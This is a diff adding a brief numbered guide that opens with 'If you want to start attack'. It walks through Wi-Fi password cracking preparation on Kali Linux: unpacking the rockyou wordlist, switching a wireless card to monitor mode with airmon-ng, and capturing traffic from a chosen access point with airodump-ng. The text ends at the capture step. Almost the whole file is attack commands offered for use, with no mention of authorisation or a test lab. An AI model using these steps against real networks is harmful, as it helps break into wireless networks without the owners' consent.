@@ -1,0 +1,13 @@
+If you want to start attack you need Kali Linux and terminal in this operation system.
+So, open the terminal and start:
+1) locate rockyou.txt
+2) cp /usr/share/wordlists/rockyou.txt.gz ./Documents(or another directory)
+3) cd Documents
+4) ls -l
+5) gunzip rockyou.txt.gz
+6) ls -l
+7) airmon-ng check kill
+8) airmon-ng
+9) airmon-ng start wlan0
+10) airodump-ng wlan0mon
+11) open new page of terminal and write: airodump-ng -c CH mac-adress -w /root/Documents wlan0mon
